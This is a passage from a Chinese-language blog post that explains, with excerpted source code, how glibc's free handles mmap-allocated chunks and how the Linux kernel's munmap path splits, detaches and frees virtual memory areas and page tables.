(*hook)(<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *) = <span class="hljs-built_in">atomic_forced_read</span> (__free_hook);<br>    <span class="hljs-keyword">if</span> (__builtin_expect(hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) &#123;<br>        (*hook)(mem, <span class="hljs-built_in">RETURN_ADDRESS</span>(<span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span>;<br><br>    p = <span class="hljs-built_in">mem2chunk</span>(mem);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">chunk_is_mmapped</span>(p))&#123;<br>        <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>                &amp;&amp; p-&gt;size<br>                        &gt; mp_.mmap_threshold&amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX) &#123;<br>            mp_.mmap_threshold = <span class="hljs-built_in">chunksize</span>(p);<br>            mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>            <span class="hljs-built_in">LIBC_PROBE</span> (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                    mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>        <span class="hljs-built_in">munmap_chunk</span>(p);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ar_ptr = <span class="hljs-built_in">arena_for_chunk</span>(p);<br>    _int_free(ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>__libc_free</code>首先查看是否有<code>__free_hook</code>函数，如果有就直接调用，这里假设没有默认函数可用。接下来通过<code>mem2chunk</code>将虚拟内存的指针<code>mem</code>转换为对应的chunk指针<code>p</code>，</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#define</span> <span class="hljs-built_in">mem2chunk</span>(mem) ((mchunkptr)((char*)(mem) - <span class="hljs-number">2</span>*SIZE_SZ))<br></code></pre></td></tr></table></figure><p>因为一个使用中的chunk结构体只使用其<code>prev_size</code>和<code>size</code>字段，因此这里只需要减去<code>2*SIZE_SZ</code>。<br>接下来，<code>chunk_is_mmapped</code>用来检查size最低三位中的标志位，判断该chunk是否是由mmap分配的，如果是，就调用<code>munmap_chunk</code>释放该chunk并返回，在调用<code>munmap_chunk</code>之前，需要更新全局的mmap阀值和收缩阀值。<br>再往下，如果该chunk不是由mmap分配的，就通过<code>arena_for_chunk</code>获得分配区指针<code>ar_ptr</code>，并调用<code>_int_free</code>释放内存。<code>_int_free</code>放在下一章分析，本章重点分析<code>munmap_chunk</code>函数。</p><h2 id="munmap-chunk"><a href="#munmap-chunk" class="headerlink" title="munmap_chunk"></a>munmap_chunk</h2><p>munmap_chunk用来释放由mmap分配的chunk，下面来看，</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> internal_function <span class="hljs-title">munmap_chunk</span><span class="hljs-params">(mchunkptr p)</span> </span>&#123;<br>    INTERNAL_SIZE_T size = <span class="hljs-built_in">chunksize</span>(p);<br><br>    <span class="hljs-built_in">assert</span>(<span class="hljs-built_in">chunk_is_mmapped</span> (p));<br><br>    <span class="hljs-type">uintptr_t</span> block = (<span class="hljs-type">uintptr_t</span>) p - p-&gt;prev_size;<br>    <span class="hljs-type">size_t</span> total_size = p-&gt;prev_size + size;<br><br>    <span class="hljs-keyword">if</span> (__builtin_expect(((block | total_size) &amp; (<span class="hljs-built_in">GLRO</span>(dl_pagesize) - <span class="hljs-number">1</span>)) != <span class="hljs-number">0</span>,<br>            <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-built_in">malloc_printerr</span>(check_action, <span class="hljs-string">&quot;munmap_chunk(): invalid pointer&quot;</span>,<br>                <span class="hljs-built_in">chunk2mem</span>(p), <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">atomic_decrement</span>(&amp;mp_.n_mmaps);<br>    <span class="hljs-built_in">atomic_add</span>(&amp;mp_.mmapped_mem, -total_size);<br><br>    __munmap((<span class="hljs-type">char</span> *) block, total_size);<br>&#125;<br></code></pre></td></tr></table></figure><p>首先获得前一个chunk的指针<code>block</code>，计算这两个chunk的<code>size</code>之和至<code>total_size</code>，接着对全局结构<code>mp_</code>进行相应的设置后，就通过<code>__munmap</code>释放这两个chunk。根据malloc的源码可知，由mmap分配的chunk是独立的，大部分情况下，<code>p-&gt;prev_size</code>为0，因此这里还是释放一个chunk，特殊情况下需要释放两个chunk，特殊情况请参考<code>_int_malloc</code>中的代码。<br><code>__munmap</code>再往下就是系统调用了，定义在linux内核代码的mmap.c中，</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">SYSCALL_DEFINE2</span>(munmap, unsigned long, addr, size_t, len)&#123;<br><br>    <span class="hljs-built_in">profile_munmap</span>(addr);<br>    return <span class="hljs-built_in">vm_munmap</span>(addr, len);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>profile_munmap</code>为空函数，下面看vm_munmap，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">vm_munmap</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">size_t</span> len)</span></span>&#123;<br><br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">mm_struct</span> *mm = current-&gt;mm;<br><br>    <span class="hljs-built_in">down_write</span>(&amp;mm-&gt;mmap_sem);<br>    ret = <span class="hljs-built_in">do_munmap</span>(mm, start, len);<br>    <span class="hljs-built_in">up_write</span>(&amp;mm-&gt;mmap_sem);<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就是信号量的操作，最主要是执行<code>do_munmap</code>释放内存，为了方便分析和查看，只复制了<code>do_munmap</code>的关键代码，</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs xquery">int do_munmap(struct mm_struct *mm, unsigned long <span class="hljs-keyword">start</span>, size_t len)&#123;<br><br>    unsigned long <span class="hljs-keyword">end</span>;<br>    struct vm_area_struct *vma, *prev, <span class="hljs-built_in">*last</span>;<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">start</span> &amp; ~PAGE_MASK) || <span class="hljs-keyword">start</span> &gt; TASK_SIZE || len &gt; TASK_SIZE-start)<br>        <span class="hljs-keyword">return</span> -EINVAL;<br>    len = PAGE_ALIGN(len);<br><br>    vma = find_vma(mm, <span class="hljs-keyword">start</span>);<br>    prev = vma-&gt;vm_prev;<br>    <span class="hljs-keyword">end</span> = <span class="hljs-keyword">start</span> + len;<br>    <span class="hljs-keyword">if</span> (vma-&gt;vm_start &gt;= <span class="hljs-keyword">end</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">start</span> &gt; vma-&gt;vm_start) &#123;<br>        int<span class="hljs-built_in"> error</span>;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">end</span> &lt; vma-&gt;vm_end &amp;&amp; mm-&gt;map_count &gt;= sysctl_max_map_count)<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br><br>       <span class="hljs-built_in"> error</span> = __split_vma(mm, vma, <span class="hljs-keyword">start</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">(error</span>)<br>            <span class="hljs-keyword">return</span><span class="hljs-built_in"> error</span>;<br>        prev = vma;<br>    &#125;<br><br>   <span class="hljs-built_in"> last</span> = find_vma(mm, <span class="hljs-keyword">end</span>);<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">(last</span> &amp;&amp; <span class="hljs-keyword">end</span> &gt;<span class="hljs-built_in"> last</span>-&gt;vm_start) &#123;<br>        int<span class="hljs-built_in"> error</span> = __split_vma(mm,<span class="hljs-built_in"> last</span>, <span class="hljs-keyword">end</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">(error</span>)<br>            <span class="hljs-keyword">return</span><span class="hljs-built_in"> error</span>;<br>    &#125;<br>    vma = prev ? prev-&gt;vm_next : mm-&gt;mmap;<br><br>    detach_vmas_to_be_unmapped(mm, vma, prev, <span class="hljs-keyword">end</span>);<br>    unmap_region(mm, vma, prev, <span class="hljs-keyword">start</span>, <span class="hljs-keyword">end</span>);<br>    arch_unmap(mm, vma, <span class="hljs-keyword">start</span>, <span class="hljs-keyword">end</span>);<br>    remove_vma_list(mm, vma);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先对传入的参数进行检查，需要释放的虚拟内存的开始地址<code>start</code>和长度<code>len</code>必须按页对齐，且不能释放内核空间的内存。<br>接着通过<code>find_vma</code>在进程的管理内存的AVL树上查找第一个结束地址大于<code>start</code>的虚拟内存<code>vma</code>，如果<code>vma-&gt;vm_start &gt;= end</code>，说明需要释放的虚拟内存本来就不存在，因此什么也不做返回；如果<code>start &gt; vma-&gt;vm_start</code>，则表示找到的<code>vma</code>包含了需要释放的内存，这时候通过<code>__split_vma</code>函数将该<code>vma</code>根据<code>start</code>地址划分成两块，因此需要判断虚拟内存的数量是否超过了系统的限制<code>sysctl_max_map_count</code>。为了方便分析，下面只给出了<code>__split_vma</code>的几行关键代码，</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> __split_vma(struct mm_struct *mm, struct vm_area_struct *vma,<br>          <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> addr, <span class="hljs-keyword">int</span> new_below)&#123;<br><br>    struct vm_area_struct *<span class="hljs-keyword">new</span>;<br>    <span class="hljs-keyword">new</span> = kmem_cache_alloc(vm_area_cachep, GFP_KERNEL);<br>    *<span class="hljs-keyword">new</span> = *vma;<br><br>    <span class="hljs-keyword">if</span> (new_below)<br>        <span class="hljs-keyword">new</span>-&gt;vm_end = addr;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">new</span>-&gt;vm_start = addr;<br>        <span class="hljs-keyword">new</span>-&gt;vm_pgoff += ((addr - vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (new_below)<br>        err = vma_adjust(vma, addr, vma-&gt;vm_end, vma-&gt;vm_pgoff +<br>            ((addr - <span class="hljs-keyword">new</span>-&gt;vm_start) &gt;&gt; PAGE_SHIFT), <span class="hljs-keyword">new</span>);<br>    <span class="hljs-keyword">else</span><br>        err = vma_adjust(vma, vma-&gt;vm_start, addr, vma-&gt;vm_pgoff, <span class="hljs-keyword">new</span>);<br><br>    <span class="hljs-keyword">if</span> (!err)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先分配一个<code>vm_area_struct</code>结构体<code>new</code>，然后将<code>vma</code>中的所有内容拷贝到<code>new</code>中，<code>new_below</code>决定将原<code>vma</code>按照<code>addr</code>决定的地址分割成两个后，<code>vma</code>中保存低地址部分还是高地址部分。<code>do_munmap</code>第一次进入<code>__split_vma</code>时<code>new_below</code>为0，因此返回的<code>vma</code>保存低地址部分。然后调用<code>vma_adjust</code>对低地址部分的<code>vma</code>进行相应的设置，主要是更改其<code>end</code>变量为<code>addr</code>，并将高地址部分插入进程内存的管理树中。</p><p>回到<code>do_munmap</code>中，<code>find_vma(mm, end)</code>获得最尾部的<code>last</code>，如果该<code>last</code>包含了需要释放的虚拟内存，就继续将其拆成两部分，这时候由于<code>new_below</code>为1，因此返回的<code>last</code>为高地址部分。返回后，<code>vma</code>将指向低地址部分。</p><p>结合前面的分析，在执行<code>detach_vmas_to_be_unmapped</code>之前，原来的vma被拆成如下所示<br>| prev | vma | … | vma | last |<br><code>mm-&gt;mmap</code>的赋值是在<code>vma_adjust</code>中，其实就是拆分后低地址处那块虚拟内存。<br>接下来<code>detach_vmas_to_be_unmapped</code>用于将所有和要释放的内存有交集的<code>vma</code>从红黑树中删除，并形成一个以<code>vma</code>为链表头的链表。根据刚刚<code>vma</code>被拆开成的结果，其实就是取数组中所有除了<code>prev</code>和<code>last</code>的元素构成一个链表。即<br>| prev | vma | … | vma | last |<br>经过<code>detach_vmas_to_be_unmapped</code>后变成，<br>| prev| last |<br>| vma | … | vma |<br>往下就是要释放第二部分。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs xl">static void detach_vmas_to_be_unmapped(struct mm_struct *mm, struct vm_area_struct *vma,<br>    struct vm_area_struct *prev, unsigned long end)&#123;<br><br>    struct vm_area_struct **insertion_point;<br>    struct vm_area_struct *tail_vma = NULL;<br><br>    <span class="hljs-function"><span class="hljs-title">insertion_point</span> = (prev ? &amp;prev-&gt;</span><span class="hljs-function"><span class="hljs-title">vm_next</span> : &amp;mm-&gt;</span>mmap);<br>    <span class="hljs-function"><span class="hljs-title">vma</span>-&gt;</span>vm_prev = NULL;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-function"><span class="hljs-title">vma_rb_erase</span>(vma, &amp;mm-&gt;</span>mm_rb);<br>        <span class="hljs-function"><span class="hljs-title">mm</span>-&gt;</span>map_count--;<br>        tail_vma = vma;<br>        <span class="hljs-function"><span class="hljs-title">vma</span> = vma-&gt;</span>vm_next;<br>    &#125; <span class="hljs-function"><span class="hljs-title">while</span> (vma &amp;&amp; vma-&gt;</span>vm_start &lt; end);<br>    *insertion_point = vma;<br>    <span class="hljs-keyword">if</span> (vma) &#123;<br>        <span class="hljs-function"><span class="hljs-title">vma</span>-&gt;</span>vm_prev = prev;<br>        vma_gap_update(vma);<br>    &#125; <span class="hljs-keyword">else</span><br>        <span class="hljs-function"><span class="hljs-title">mm</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">highest_vm_end</span> = prev ? prev-&gt;</span>vm_end : <span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-title">tail_vma</span>-&gt;</span>vm_next = NULL;<br><br>    vmacache_invalidate(mm);<br>&#125;<br></code></pre></td></tr></table></figure><p>回到<code>do_munmap</code>中，<code>unmap_region</code>就是用于释放内存了。下面来看，</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">unmap_region</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm,</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-keyword">struct</span> vm_area_struct *prev,</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end)</span></span>&#123;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">vm_area_struct</span> *next = prev ? prev-&gt;vm_next : mm-&gt;mmap;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">mmu_gather</span> tlb;<br><br>    <span class="hljs-built_in">lru_add_drain</span>();<br>    <span class="hljs-built_in">tlb_gather_mmu</span>(&amp;tlb, mm, start, end);<br>    <span class="hljs-built_in">update_hiwater_rss</span>(mm);<br>    <span class="hljs-built_in">unmap_vmas</span>(&amp;tlb, vma, start, end);<br>    <span class="hljs-built_in">free_pgtables</span>(&amp;tlb, vma, prev ? prev-&gt;vm_end : FIRST_USER_ADDRESS,<br>                 next ? next-&gt;vm_start : USER_PGTABLES_CEILING);<br>    <span class="hljs-built_in">tlb_finish_mmu</span>(&amp;tlb, start, end);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>lru_add_drain</code>用于将<code>percpu</code>变量<code>pagevec</code>对应的每个<code>page</code>放回其对应的<code>zone</code>的<code>lru</code>链表中，因为马上要解映射了，这些缓存的page变量由可能被改变。<br><code>tlb_gather_mmu</code>构造了一个<code>mmu_gather</code>变量并初始化。<br>接下来的<code>unmap_vmas</code>用于解映射，即释放存在物理页面映射的虚拟内存，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">unmap_vmas</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mmu_gather *tlb, <span class="hljs-keyword">struct</span> vm_area_struct *vma, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start_addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end_addr)</span></span>&#123;<br><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">mm_struct</span> *mm = vma-&gt;vm_mm;<br><br>    <span class="hljs-built_in">mmu_notifier_invalidate_range_start</span>(mm, start_addr, end_addr);<br>    <span class="hljs-keyword">for</span> ( ; vma &amp;&amp; vma-&gt;vm_start &lt; end_addr; vma = vma-&gt;vm_next)<br>        <span class="hljs-built_in">unmap_single_vma</span>(tlb, vma, start_addr, end_addr, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">mmu_notifier_invalidate_range_end</span>(mm, start_addr, end_addr);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里开始遍历<code>vma</code>链表，对每个<code>vma</code>调用<code>unmap_single_vma</code>进行释放，</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">unmap_single_vma</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mmu_gather *tlb, <span class="hljs-keyword">struct</span> vm_area_struct *vma,                        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start_addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end_addr, <span class="hljs-keyword">struct</span> zap_details *details)</span></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start = <span class="hljs-built_in">max</span>(vma-&gt;vm_start, start_addr);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> end;<br><br>    <span class="hljs-keyword">if</span> (start &gt;= vma-&gt;vm_end)<br>        <span class="hljs-keyword">return</span>;<br>    end = <span class="hljs-built_in">min</span>(vma-&gt;vm_end, end_addr);<br>    <span class="hljs-keyword">if</span> (end &lt;= vma-&gt;vm_start)<br>        <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-keyword">if</span> (vma-&gt;vm_file)<br>        <span class="hljs-built_in">uprobe_munmap</span>(vma, start, end);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">unlikely</span>(vma-&gt;vm_flags &amp; VM_PFNMAP))<br>        <span class="hljs-built_in">untrack_pfn</span>(vma, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">if</span> (start != end) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">unlikely</span>(<span class="hljs-built_in">is_vm_hugetlb_page</span>(vma))) &#123;<br>            <span class="hljs-keyword">if</span> (vma-&gt;vm_file) &#123;<br>                <span class="hljs-built_in">i_mmap_lock_write</span>(vma-&gt;vm_file-&gt;f_mapping);<br>                __unmap_hugepage_range_final(tlb, vma, start, end, <span class="hljs-literal">NULL</span>);<br>                <span class="hljs-built_in">i_mmap_unlock_write</span>(vma-&gt;vm_file-&gt;f_mapping);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">unmap_page_range</span>(tlb, vma, start, end, details);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里主要就是通过<code>unmap_page_range</code>进行释放。再往下因为涉及太多linux内核内存管理的知识，这里就不深入分析了，最后就是通过虚拟地址找到页表<code>pte</code>，解开和物理页面之间的映射，并设置一些page结构。<br>由于<code>unmap_vmas</code>后，一些页表里没有了相对应的物理页面，<code>free_pgtables</code>将这些页表释放。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs xl">void free_pgtables(struct mmu_gather *tlb, struct vm_area_struct *vma,<br>        unsigned long <span class="hljs-built_in">floor</span>, unsigned long ceiling)&#123;<br><br>    <span class="hljs-keyword">while</span> (vma) &#123;<br>        <span class="hljs-function"><span class="hljs-title">struct</span> vm_area_struct *next = vma-&gt;</span>vm_next;<br>        <span class="hljs-function"><span class="hljs-title">unsigned</span> long addr = vma-&gt;</span>vm_start;<br><br>        unlink_anon_vmas(vma);<br>        unlink_file_vma(vma);<br><br>        <span class="hljs-keyword">if</span> (is_vm_hugetlb_page(vma)) &#123;<br>            <span class="hljs-function"><span class="hljs-title">hugetlb_free_pgd_range</span>(tlb, addr, vma-&gt;</span>vm_end,<br>                <span class="hljs-function"><span class="hljs-title">floor</span>, next? next-&gt;</span>vm_start: ceiling);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br><br>            <span class="hljs-function"><span class="hljs-title">while</span> (next &amp;&amp; next-&gt;</span><span class="hljs-function"><span class="hljs-title">vm_start</span> &lt;= vma-&gt;</span>vm_end + PMD_SIZE<br>                   &amp;&amp; !is_vm_hugetlb_page(next)) &#123;<br>                vma = next;<br>                <span class="hljs-function"><span class="hljs-title">next</span> = vma-&gt;</span>vm_next;<br>                unlink_anon_vmas(vma);<br>                unlink_file_vma(vma);<br>            &#125;<br>            <span class="hljs-function"><span class="hljs-title">free_pgd_range</span>(tlb, addr, vma-&gt;</span>vm_end,<br>                <span class="hljs-function"><span class="hljs-title">floor</span>, next? next-&gt;</span>vm_start: ceiling);<br>        &#125;<br>        vma = next;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里主要是调用<code>free_pgd_range</code>。该函数中，假设要释放的虚拟内存为vma，其前一个vma为<code>prev</code>，后一个为<code>last</code>，如果释放完<code>vma</code>后，<code>prev-&gt;vm_end</code>到<code>last-&gt;vm_start</code>大于一个pgd管理的内存大小（32位系统下为4MB），就释放pgd里的所有页表，如果小于4MB，就什么也不做返回。</p><p>再回到<code>do_munmap</code>中，<code>arch_unmap</code>是一些体系结构相关的操作，不管它。<code>remove_vma_list</code>释放每个<code>vma</code>对应的<code>vm_area_struct</code>结构至slab分配器中。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">remove_vma_list</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_accounted = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">update_hiwater_vm</span>(mm);<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-type">long</span> nrpages = <span class="hljs-built_in">vma_pages</span>(vma);<br><br>        <span class="hljs-keyword">if</span> (vma-&gt;vm_flags &amp; VM_ACCOUNT)<br>            nr_accounted += nrpages;<br>        <span class="hljs-built_in">vm_stat_account</span>(mm, vma-&gt;vm_flags, vma-&gt;vm_file, -nrpages);<br>        vma = <span class="hljs-built_in">remove_vma</span>(vma);<br>    &#125; <span class="hljs-keyword">while</span> (vma);<br>    <span class="hljs-built_in">vm_unacct_memory</span>(nr_accounted);<br>    <span class="hljs-built_in">validate_mm</span>(mm);<br>&#125;<br></code></pre></td></tr></table></figure><p>主要的函数是<code>remove_vma</code>，该函数通过<code>kmem_cache_free</code>释放对应的<code>vma</code>，并返回链表上的下一个<code>vma</code>。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xl">static struct vm_area_struct *remove_vma(struct vm_area_struct *vma)&#123;<br><br>    <span class="hljs-function"><span class="hljs-title">struct</span> vm_area_struct *next = vma-&gt;</span>vm_next;<br><br>    might_sleep();<br>    <span class="hljs-function"><span class="hljs-title">if</span> (vma-&gt;</span><span 